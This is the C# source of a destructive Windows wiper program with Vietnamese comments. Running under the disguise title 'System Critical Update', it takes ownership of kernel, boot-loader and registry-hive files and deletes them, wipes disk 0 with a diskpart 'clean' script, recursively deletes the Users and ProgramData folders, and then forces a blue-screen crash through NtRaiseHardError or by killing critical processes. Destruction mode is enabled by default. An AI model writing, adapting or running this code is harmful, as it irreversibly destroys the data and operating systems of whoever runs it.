using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

namespace Wiper
{
    class Program
    {
        // === CẤU HÌNH AN TOÀN ===
        private static bool _enableDestruction = true; // QUAN TRỌNG: Đổi thành true để kích hoạt
        private static string _logFile = "destruction_log.txt";

        // Import hàm Windows API để trigger BSOD
        [DllImport("ntdll.dll")]
        private static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

        [DllImport("ntdll.dll")]
        private static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

        static void Main(string[] args)
        {
            Console.Title = "System Critical Update";
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("\n==========================================");
            Console.WriteLine("!!! CRITICAL SYSTEM PROCESS STARTED !!!");
            Console.WriteLine("==========================================\n");

            InitializeLog();

            // Phase 1: Xóa các file hệ thống quan trọng
            string[] criticalFiles = {
                @"C:\Windows\System32\ntoskrnl.exe",
                @"C:\Windows\System32\boot\winload.exe",
                @"C:\Windows\System32\hal.dll",
                @"C:\Windows\System32\drivers\disk.sys",
                @"C:\Windows\System32\drivers\ntfs.sys",
                @"C:\Windows\System32\config\SAM",          // Security Accounts Manager
                @"C:\Windows\System32\config\SYSTEM",       // Registry SYSTEM hive
                @"C:\Windows\System32\config\SOFTWARE",     // Registry SOFTWARE hive
                @"C:\Windows\System32\winload.efi",         // UEFI Boot Loader
                @"C:\Windows\System32\drivers\volmgr.sys",  // Volume Manager
                @"C:\Windows\System32\drivers\partmgr.sys"  // Partition Manager
            };

            Console.WriteLine("[Phase 1] Destroying critical system files...\n");
            int successCount = 0;

            foreach (var file in criticalFiles)
            {
                if (DestroyFile(file))
                    successCount++;
            }

            // Phase 2: Xóa MBR/GPT và Partition Table (nếu có quyền)
            Console.WriteLine("\n[Phase 2] Attempting to corrupt disk structures...\n");
            CorruptDiskStructures();

            // Phase 3: Xóa dữ liệu người dùng quan trọng
            Console.WriteLine("\n[Phase 3] Destroying user data...\n");
            DestroyUserData();

            string summary = $"\n=== OPERATION SUMMARY ===\nCritical files deleted: {successCount}/{criticalFiles.Length}\nTimestamp: {DateTime.Now}";
            Console.WriteLine(summary);
            WriteLog(summary);

            // Quyết định: Trigger BSOD ngay hoặc ghi log
            if (successCount > 0 && _enableDestruction)
            {
                Console.WriteLine("\n[CRITICAL] Destruction successful. Triggering immediate system crash...");
                WriteLog("[CRITICAL] System compromised. Initiating BSOD...");
                Thread.Sleep(2000);

                TriggerBSOD();
            }
            else
            {
                Console.WriteLine("\n[SIMULATION MODE] No actual damage done.");
                Console.WriteLine($"Log saved: {Path.GetFullPath(_logFile)}");
                Console.WriteLine("\nPress Enter to exit...");
                Console.ReadLine();
            }
        }

        static void InitializeLog()
        {
            try
            {
                string logHeader = $"=== WIPER OPERATION LOG ===\n" +
                                 $"Start Time: {DateTime.Now}\n" +
                                 $"Target: {Environment.MachineName}\n" +
                                 $"OS: {Environment.OSVersion}\n" +
                                 $"Mode: {(_enableDestruction ? "DESTRUCTION" : "SIMULATION")}\n\n";
                File.WriteAllText(_logFile, logHeader);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[WARNING] Log initialization failed: {ex.Message}");
            }
        }

        static void WriteLog(string message)
        {
            try
            {
                File.AppendAllText(_logFile, $"[{DateTime.Now:HH:mm:ss}] {message}\n");
            }
            catch { }
        }

        static bool DestroyFile(string filePath)
        {
            try
            {
                if (_enableDestruction)
                {
                    if (File.Exists(filePath))
                    {
                        // Cố gắng lấy ownership và xóa
                        try
                        {
                            // Sử dụng takeown và icacls để chiếm quyền
                            Process.Start(new ProcessStartInfo
                            {
                                FileName = "takeown",
                                Arguments = $"/f \"{filePath}\"",
                                CreateNoWindow = true,
                                UseShellExecute = false,
                                RedirectStandardOutput = true
                            })?.WaitForExit(5000);

                            Process.Start(new ProcessStartInfo
                            {
                                FileName = "icacls",
                                Arguments = $"\"{filePath}\" /grant Administrators:F",
                                CreateNoWindow = true,
                                UseShellExecute = false,
                                RedirectStandardOutput = true
                            })?.WaitForExit(5000);
                        }
                        catch { }

                        File.SetAttributes(filePath, FileAttributes.Normal);
                        File.Delete(filePath);

                        string msg = $"[✓ DELETED] {filePath}";
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine(msg);
                        Console.ForegroundColor = ConsoleColor.Red;
                        WriteLog(msg);
                        return true;
                    }
                    else
                    {
                        string msg = $"[! NOT FOUND] {filePath}";
                        Console.ForegroundColor = ConsoleColor.Yellow;
                        Console.WriteLine(msg);
                        Console.ForegroundColor = ConsoleColor.Red;
                        WriteLog(msg);
                        return false;
                    }
                }
                else
                {
                    string msg = $"[SIM] Would delete: {filePath}";
                    Console.ForegroundColor = ConsoleColor.Cyan;
                    Console.WriteLine(msg);
                    Console.ForegroundColor = ConsoleColor.Red;
                    WriteLog(msg);
                    Thread.Sleep(100);
                    return true;
                }
            }
            catch (Exception ex)
            {
                string msg = $"[✗ FAILED] {filePath} - {ex.Message}";
                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.WriteLine(msg);
                Console.ForegroundColor = ConsoleColor.Red;
                WriteLog(msg);
                return false;
            }
        }

        static void CorruptDiskStructures()
        {
            try
            {
                if (_enableDestruction)
                {
                    // Ghi đè MBR/GPT bằng dd hoặc sử dụng raw disk write
                    Console.WriteLine("[!] Attempting to corrupt boot sector...");
                    WriteLog("[DISK] Attempting disk structure corruption");

                    // Sử dụng diskpart để xóa partitions
                    string diskpartScript = "list disk\nselect disk 0\nclean\nexit";
                    string scriptPath = Path.GetTempFileName();
                    File.WriteAllText(scriptPath, diskpartScript);

                    Process.Start(new ProcessStartInfo
                    {
                        FileName = "diskpart",
                        Arguments = $"/s \"{scriptPath}\"",
                        CreateNoWindow = true,
                        UseShellExecute = false,
                        Verb = "runas"
                    })?.WaitForExit(10000);

                    Console.WriteLine("[✓] Disk structure corruption attempted");
                    WriteLog("[DISK] Disk structure corruption completed");
                }
                else
                {
                    Console.WriteLine("[SIM] Would corrupt disk structures (MBR/GPT)");
                    WriteLog("[SIM] Disk corruption skipped");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[✗] Disk corruption failed: {ex.Message}");
                WriteLog($"[DISK ERROR] {ex.Message}");
            }
        }

        static void DestroyUserData()
        {
            try
            {
                string[] userPaths = {
                    @"C:\Users",
                    @"C:\ProgramData",
                    @"C:\Windows\System32\config"
                };

                foreach (var path in userPaths)
                {
                    if (_enableDestruction)
                    {
                        if (Directory.Exists(path))
                        {
                            Console.WriteLine($"[!] Destroying: {path}");
                            WriteLog($"[DATA] Destroying {path}");

                            try
                            {
                                Directory.Delete(path, true);
                                Console.WriteLine($"[✓] Deleted: {path}");
                            }
                            catch (Exception ex)
                            {
                                Console.WriteLine($"[✗] Partial delete: {path} - {ex.Message}");
                            }
                        }
                    }
                    else
                    {
                        Console.WriteLine($"[SIM] Would delete directory: {path}");
                    }
                }
            }
            catch (Exception ex)
            {
                WriteLog($"[DATA ERROR] {ex.Message}");
            }
        }

        static void TriggerBSOD()
        {
            try
            {
                Console.WriteLine("\n[FINAL] Triggering Blue Screen of Death...");
                WriteLog("[BSOD] Initiating system crash");

                bool previousValue;
                RtlAdjustPrivilege(19, true, false, out previousValue); // Enable shutdown privilege

                uint response;
                // 0xDEADDEAD = Custom error code
                NtRaiseHardError(0xDEADDEAD, 0, 0, IntPtr.Zero, 6, out response);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] BSOD trigger failed, trying alternative methods...");
                WriteLog($"[BSOD ERROR] {ex.Message}");

                // Phương pháp dự phòng: Kill critical processes
                try
                {
                    string[] criticalProcesses = { "csrss", "smss", "wininit", "services" };
                    foreach (var proc in criticalProcesses)
                    {
                        Process.Start(new ProcessStartInfo
                        {
                            FileName = "taskkill",
                            Arguments = $"/f /im {proc}.exe",
                            CreateNoWindow = true,
                            UseShellExecute = false
                        });
                    }
                }
                catch
                {
                    Console.WriteLine("[✗] All crash methods failed. System may still be operational.");
                    WriteLog("[ERROR] Unable to trigger immediate crash");
                    Console.ReadLine();
                }
            }
        }
    }
}